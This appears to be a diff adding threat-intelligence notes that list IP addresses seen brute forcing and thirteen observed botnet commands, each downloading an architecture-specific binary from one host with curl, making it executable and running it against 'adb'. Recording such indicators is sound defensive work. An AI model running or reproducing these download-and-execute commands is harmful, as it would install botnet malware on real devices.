@@ -1,5 +1,27 @@
+Top IP's seen to be brute forcing:
+
 223.13.28.81
 151.73.4.130
 116.30.86.153
 221.154.46.100
 110.183.30.232
+
+
+Low detection malware observed :
+
+
+curl hxxp://2.59.254.155/arm; chmod 777 arm; ./arm adb
+curl hxxp://2.59.254.155/arm5; chmod 777 arm5; ./arm5 adb
+curl hxxp://2.59.254.155/arm6; chmod 777 arm6; ./arm6 adb
+curl hxxp://2.59.254.155/arm7; chmod 777 arm7; ./arm7 adb
+curl hxxp://2.59.254.155/sh4; chmod 777 sh4; ./sh4 adb
+curl hxxp://2.59.254.155/arc; chmod 777 arc; ./arc adb
+curl hxxp://2.59.254.155/mips; chmod 777 mips; ./mips adb
+curl hxxp://2.59.254.155/mipsel; chmod 777 mipsel; ./mipsel adb
+curl hxxp://2.59.254.155/sparc; chmod 777 sparc; ./sparc adb
+curl hxxp://2.59.254.155/x86_64; chmod 777 x86_64; ./x86_64 adb
+curl hxxp://2.59.254.155/x86; chmod 777 x86; ./x86 adb
+curl hxxp://2.59.254.155/i686; chmod 777 i686; ./i686 adb
+curl hxxp://2.59.254.155/i586; chmod 777 i586; ./i586 adb
+
+Seem like the botnet author is not checking for user agents and looking serving payload only if user agent is `curl`
